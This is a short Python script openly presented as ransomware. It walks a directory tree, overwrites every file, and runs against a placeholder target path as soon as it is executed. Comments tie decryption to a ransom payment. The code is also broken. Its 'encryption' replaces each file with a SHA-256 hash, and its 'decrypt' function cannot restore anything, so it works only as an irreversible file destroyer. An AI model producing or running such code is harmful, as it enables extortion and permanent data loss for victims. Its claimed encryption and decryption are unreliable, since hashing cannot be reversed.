import os
import hashlib

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    
    encrypted_data = hashlib.sha256(data + key.encode()).hexdigest()
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_data.encode())

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read().decode()
    
    decrypted_data = hashlib.sha256(encrypted_data[:-64].encode() + key.encode()).hexdigest()
    
    with open(file_path, 'wb') as file:
        file.write(decrypted_data.encode())

def ransomware(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def decrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

directory_to_target = "C:/target_directory"  # Specify the directory to target
encryption_key = "YOUR_ENCRYPTION_KEY"  # Set your encryption key

# To encrypt the files in the specified directory:
ransomware(directory_to_target, encryption_key)

# To decrypt the files (after receiving the ransom payment, for example):
decrypt_files(directory_to_target, encryption_key)
